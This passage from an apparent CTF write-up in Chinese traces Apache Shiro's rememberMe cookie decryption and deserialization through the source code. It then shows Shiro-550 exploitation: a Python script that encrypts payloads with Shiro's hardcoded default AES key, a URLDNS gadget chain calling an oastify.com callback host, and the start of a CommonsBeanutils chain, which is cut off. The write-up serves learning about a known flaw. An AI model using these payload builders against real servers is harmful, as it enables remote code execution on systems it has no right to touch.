+<p>最后是会对获取到的 rememberMe 值进行 base64 解码，最终返回解码后的字节数组<code>decoded</code></p>
+<p><code>base64 = ensurePadding(base64);</code>是判断 Cookie 是否符合base64编码长度</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203205810106.png" srcset="/img/loading.gif" lazyload alt="image-20260203205810106"></p>
+<p><code>getRememberedSerializedIdentity()</code>这个方法的作用就是：去读取 Cookie <code>rememberMe</code>，拿到那串被加密和 base64 编码后的字符串，并将其还原为字节数组<code>byte[]</code></p>
+<p>逆向上去，找找哪里调用到<code>getRememberedSerializedIdentity()</code>这个方法，查找这个方法的用法，找不到可以点IDEA左边的那个m，下载一下源码</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203212205039.png" srcset="/img/loading.gif" lazyload alt="image-20260203212205039"></p>
+<p>可以找到<code>AbstractRememberMeManager.getRememberedPrincipals()</code>方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203212342723.png" srcset="/img/loading.gif" lazyload alt="image-20260203212342723"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203212421302.png" srcset="/img/loading.gif" lazyload alt="image-20260203212421302"></p>
+<p><code>PrincipalCollection</code>，是一个包含用户身份信息集合的一个类，刚开始<code>principals</code>的初始值为<code>null</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203214010459.png" srcset="/img/loading.gif" lazyload alt="image-20260203214010459"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br></code></pre></td></tr></table></figure>
+
+<p>看 393 行这句代码会调用<code>getRememberedSerializedIdentity()</code>方法，获取 base64 解码后的 Cookie 并赋值给<code>bytes</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">principals = convertBytesToPrincipals(bytes, subjectContext);<br></code></pre></td></tr></table></figure>
+
+<p>然后再往下 396 行这句代码就会调用<code>convertBytesToPrincipals()</code>方法，并将<code>bytes</code>作为参数传进去</p>
+<p>跟进看看<code>convertBytesToPrincipals()</code>方法：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203214434672.png" srcset="/img/loading.gif" lazyload alt="image-20260203214434672"></p>
+<p>很明显这个方法就做了两件事：</p>
+<ul>
+<li>调用<code>decrypt()</code>方法对传入的<code>bytes</code>进行解密</li>
+<li>调用<code>deserialize()</code>方法对解密后的<code>bytes</code>进行反序列化</li>
+</ul>
+<h4 id="decrypt-方法AES解密"><a href="#decrypt-方法AES解密" class="headerlink" title="decrypt()方法AES解密"></a>decrypt()方法AES解密</h4><p>先跟进<code>decrypt()</code>解密方法中：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203215907881.png" srcset="/img/loading.gif" lazyload alt="image-20260203215907881"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br></code></pre></td></tr></table></figure>
+
+<p>487 行这句代码就是调用<code>getCipherService()</code>方法，获取密钥服务，这里也就是获取负责处理 AES 算法的工具类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());<br></code></pre></td></tr></table></figure>
+
+<p>然后是 489 行，会调用到<code>decrypt()</code>和<code>getDecryptionCipherKey()</code>这俩方法</p>
+<p>先看<code>decrypt()</code>：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203220142001.png" srcset="/img/loading.gif" lazyload alt="image-20260203220142001"></p>
+<p>是一个接口，接收两个参数，第一个参数是加密的数组，第二个参数是解密的<code>key</code></p>
+<p>再回来 489 行看，传入的第一个参数就是加密的数组<code>encrypted</code>（也就是 base64 解码后的 Cookie ），第二个参数就是<code>getDecryptionCipherKey()</code>这个方法，说明它的返回值是解密的密钥<code>key</code></p>
+<p>跟进<code>getDecryptionCipherKey()</code>这个方法看看：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203220416608.png" srcset="/img/loading.gif" lazyload alt="image-20260203220416608"></p>
+<p>这个方法直接返回一个常量<code>decryptionCipherKey</code>，这个常量是一个字节数组</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203220617229.png" srcset="/img/loading.gif" lazyload alt="image-20260203220617229"></p>
+<p>去找找哪里调用到了<code>decryptionCipherKey</code>：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221028342.png" srcset="/img/loading.gif" lazyload alt="image-20260203221028342"></p>
+<p>有一个写入值的用法，是在<code>setDecryptionCipherKey()</code>方法中的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221119327.png" srcset="/img/loading.gif" lazyload alt="image-20260203221119327"></p>
+<p>继续往上找哪里调用了<code>setDecryptionCipherKey()</code>这个方法：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221612488.png" srcset="/img/loading.gif" lazyload alt="image-20260203221612488"></p>
+<p>在<code>setCipherKey()</code>方法中调用的，这个方法里会调用俩方法，一个加密一个解密，共用的同一个密钥：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203222246430.png" srcset="/img/loading.gif" lazyload alt="image-20260203222246430"></p>
+<p>继续往上找哪里调用了<code>setCipherKey()</code>这个方法：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221722027.png" srcset="/img/loading.gif" lazyload alt="image-20260203221722027"></p>
+<p>在<code>AbstractRememberMeManager()</code>方法中：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221752374.png" srcset="/img/loading.gif" lazyload alt="image-20260203221752374"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<br></code></pre></td></tr></table></figure>
+
+<p>在 109 行调用的，传入的<code>DEFAULT_CIPHER_KEY_BYTES</code>，这个参数名就很明显了，跟进看是一个常量，是一个固定的<code>key</code>：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203221932025.png" srcset="/img/loading.gif" lazyload alt="image-20260203221932025"></p>
+<p>一整条找<code>key</code>的思路如下，一层层往上找，最终找到固定的<code>key</code>：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203223700213.png" srcset="/img/loading.gif" lazyload alt="image-20260203223700213"></p>
+<p>所以 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量</p>
+<h4 id="deserialize-反序列化"><a href="#deserialize-反序列化" class="headerlink" title="deserialize()反序列化"></a>deserialize()反序列化</h4><p>再回到<code>convertBytesToPrincipals()</code>这里，还有一个<code>deserialize</code>方法，跟进去看一看：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203224217012.png" srcset="/img/loading.gif" lazyload alt="image-20260203224217012"></p>
+<p><code>deserialize</code>方法传入的参数是已经解密好的二进制字节数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> getSerializer().deserialize(serializedIdentity);<br></code></pre></td></tr></table></figure>
+
+<p><code>getSerializer()</code>：获取 Shiro 配置的序列化器，默认使用的是 <code>DefaultSerializer</code>，其底层就是 Java 标准的 <code>ObjectInputStream</code> 逻辑</p>
+<p>跟进<code>deserialize()</code>方法看看：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203224818875.png" srcset="/img/loading.gif" lazyload alt="image-20260203224818875"></p>
+<p>是一个接口，看看<code>deserialize()</code>的实现方法有哪些，ctrl+alt+B</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60204102041690.png" srcset="/img/loading.gif" lazyload alt="image-20260204102041690"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60204102122842.png" srcset="/img/loading.gif" lazyload alt="image-20260204102122842"></p>
+<p>在 shiro 包里的<code>DefaultSerializer.deserialize()</code>方法里调用了<code>readObject</code>方法，所以这里就是反序列化的入口</p>
+<h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>打断点进行调试，在<code>AbstractRememberMeManager.onSuccessfulLogin()</code>开始打断点</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60204102600244.png" srcset="/img/loading.gif" lazyload alt="image-20260204102600244"></p>
+<p>然后直接调试</p>
+<blockquote>
+<p>这里调试之前服务应该是要没有启动运行的</p>
+</blockquote>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209234335957.png" srcset="/img/loading.gif" lazyload alt="image-20260209234335957"></p>
+<p>运行起服务后用bp抓登录包，输入正确的 Username 和 Password</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209234423832.png" srcset="/img/loading.gif" lazyload alt="image-20260209234423832"></p>
+<p>放到Repeater里发包就可以断到这里了</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209234444868.png" srcset="/img/loading.gif" lazyload alt="image-20260209234444868"></p>
+<p>开始是一堆判断是不是 HTTP 的，直接在下面再加个断点</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209234831751.png" srcset="/img/loading.gif" lazyload alt="image-20260209234831751"></p>
+<p>F9恢复到断点的地方</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209234914283.png" srcset="/img/loading.gif" lazyload alt="image-20260209234914283"></p>
+<p>这里就是进入到<code>isRememberMe()</code>方法里，判断有没有<code>RememberMe</code>字段，如果有就继续调用<code>rememberIdentity()</code>方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60209235122010.png" srcset="/img/loading.gif" lazyload alt="image-20260209235122010"></p>
+<p>先进入<code>getIdentityToRemember()</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105045161.png" srcset="/img/loading.gif" lazyload alt="image-20260210105045161"></p>
+<p>一连串调用来保存用户名的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105119352.png" srcset="/img/loading.gif" lazyload alt="image-20260210105119352"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105140984.png" srcset="/img/loading.gif" lazyload alt="image-20260210105140984"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105210878.png" srcset="/img/loading.gif" lazyload alt="image-20260210105210878"></p>
+<p>回到<code>rememberIdentity()</code>，继续跟进<code>rememberIdentity(subject, principals);</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105253366.png" srcset="/img/loading.gif" lazyload alt="image-20260210105253366"></p>
+<p>里面调用的<code>convertPrincipalsToBytes()</code>方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105439861.png" srcset="/img/loading.gif" lazyload alt="image-20260210105439861"></p>
+<p>和之前解密时候的<code>convertBytesToPrincipals()</code>方法是相反的</p>
+<p>这里是先<code>serialize()</code>序列化，然后<code>encrypt()</code>进行加密</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105600413.png" srcset="/img/loading.gif" lazyload alt="image-20260210105600413"></p>
+<blockquote>
+<p>贴一下前面<code>convertBytesToPrincipals()</code>方法对比一下</p>
+<p>前面的是先<code>decrypt()</code>解密，然后<code>deserialize()</code>反序列化</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105720215.png" srcset="/img/loading.gif" lazyload alt="image-20260210105720215"></p>
+</blockquote>
+<h4 id="serialize-序列化"><a href="#serialize-序列化" class="headerlink" title="serialize()序列化"></a>serialize()序列化</h4><p>先跟进<code>serialize()</code>看看序列化方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210105919313.png" srcset="/img/loading.gif" lazyload alt="image-20260210105919313"></p>
+<p>继续跟进<code>getSerializer().serialize()</code>，可以找到<code>oos.wirteObject(o);</code>这句，就是进行序列化的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210110055752.png" srcset="/img/loading.gif" lazyload alt="image-20260210110055752"></p>
+<h4 id="encrypt-方法AES加密"><a href="#encrypt-方法AES加密" class="headerlink" title="encrypt()方法AES加密"></a>encrypt()方法AES加密</h4><p>然后往下来看<code>encrypt()</code>加密方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210110314395.png" srcset="/img/loading.gif" lazyload alt="image-20260210110314395"></p>
+<p>和前面解密的样子差不多，这里改成了<code>encrypt()</code>和<code>getEncryptionCipherKey()</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210110937937.png" srcset="/img/loading.gif" lazyload alt="image-20260210110937937"></p>
+<p>跟进<code>getEncryptionCipherKey()</code>方法，顾名思义就是和获取加密的<code>key</code>有关的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111058267.png" srcset="/img/loading.gif" lazyload alt="image-20260210111058267"></p>
+<p>跟进这个方法，是<code>return</code>返回一个常量<code>encryptionCipherKey</code>，就是加密的密钥</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210110541031.png" srcset="/img/loading.gif" lazyload alt="image-20260210110541031"></p>
+<p>和前面解密一样去找它的用法，具体的流程也差不多，不过是换了方法名</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111217418.png" srcset="/img/loading.gif" lazyload alt="image-20260210111217418"></p>
+<p>可以找到有个写入值的用法，在<code>AbstractRememberMeManager.setEncryptionCipherKey()</code></p>
+<p>继续找哪里调用的<code>setEncryptionCipherKey()</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111447896.png" srcset="/img/loading.gif" lazyload alt="image-20260210111447896"></p>
+<p>可以找到<code>setCipherKey</code>这个方法，之前的解密也是找到的这里，上面加密的，下面解密的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111531610.png" srcset="/img/loading.gif" lazyload alt="image-20260210111531610"></p>
+<p>再往前就是找到<code>AbstractRememberMeManager()</code>方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111612789.png" srcset="/img/loading.gif" lazyload alt="image-20260210111612789"></p>
+<p>这里传给<code>setCipherKey</code>的值就是<code>DEFAULT_CIPHER_KEY_BYTES</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111731604.png" srcset="/img/loading.gif" lazyload alt="image-20260210111731604"></p>
+<p>也就是这个固定值密钥</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210111713141.png" srcset="/img/loading.gif" lazyload alt="image-20260210111713141"></p>
+<p>然后回头再跟进看看<code>encrypt()</code>方法</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210112527688.png" srcset="/img/loading.gif" lazyload alt="image-20260210112527688"></p>
+<p>传入的分别是要加密的明文数据和密钥，然后经过 AES 加密后返回加密后的数据</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210113029513.png" srcset="/img/loading.gif" lazyload alt="image-20260210113029513"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210113052071.png" srcset="/img/loading.gif" lazyload alt="image-20260210113052071"></p>
+<h4 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h4><p>继续往下又回到了<code>rememberIdentity()</code>这里，继续进入到<code>rememberSerializedIdentity()</code>方法中</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210113149420.png" srcset="/img/loading.gif" lazyload alt="image-20260210113149420"></p>
+<p><code>rememberSerializedIdentity()</code>中会先检查 Subject 是否来自 HTTP 请求，如果是的话就会对加密好的数据进行base64编码，最终存储到 Cookie 中</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210113307546.png" srcset="/img/loading.gif" lazyload alt="image-20260210113307546"></p>
+<p>以上就是加密的所有过程了</p>
+<h1 id="Shiro550漏洞利用"><a href="#Shiro550漏洞利用" class="headerlink" title="Shiro550漏洞利用"></a>Shiro550漏洞利用</h1><blockquote>
+<p>漏洞利用的思路：</p>
+<ul>
+<li>既然 RCE，或者说弹 shell，是在反序列化的时候触发的。</li>
+</ul>
+<p>那我们的攻击就应该是将反序列化的东西，进行 shiro 的一系列加密操作，再把最后的那串东西替换包中的 RememberMe 字段的值</p>
+</blockquote>
+<p>加密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># －*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2022/7/13 17:36</span><br><span class="hljs-comment"># @Author  : Drunkbaby</span><br><span class="hljs-comment"># @FileName: poc.py</span><br><span class="hljs-comment"># @Software: VSCode</span><br><span class="hljs-comment"># @Blog    ：https://drun1baby.github.io/</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64decode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br><br></code></pre></td></tr></table></figure>
+
+<p>我自己也不会写，直接搬大佬文章里的了</p>
+<p>我运行时候少个库，所以就把没用到的库删</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210121643097.png" srcset="/img/loading.gif" lazyload alt="image-20260210121643097"></p>
+<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>之前写好的，直接拿来用了</p>
+<p>URLDNS链笔记：<a href="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/">https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String file)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">oic</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> oic;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://o1qhbnt17z1ru666mc2rs4n10s6jufi4.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">123456</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>只要序列化就行，然后把生成的<code>ser.bin</code>文件放到 python 加密脚本的同目录下，然后运行</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210134459002.png" srcset="/img/loading.gif" lazyload alt="image-20260210134459002"></p>
+<p>然后把 Cookie 里的 rememberMe 替换为这个，这里要删掉 JSESSIONID，因为当存在 JSESSIONID 时，会忽略 rememberMe</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210134557725.png" srcset="/img/loading.gif" lazyload alt="image-20260210134557725"></p>
+<p>发包之后就可以 收到 DNS 请求了</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210134615428.png" srcset="/img/loading.gif" lazyload alt="image-20260210134615428"></p>
+<h2 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h2><p>CB链笔记：<a href="https://yschen20.github.io/2026/02/09/CB%E9%93%BE/">https://yschen20.github.io/2026/02/09/CB%E9%93%BE/</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        java.io.<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileOutputStream(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        java.io.<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectOutputStream(fos);<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        java.io.<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(Filename);<br>        java.io.<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectInputStream(fis);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;CB&quot;</span>);<br>        <span 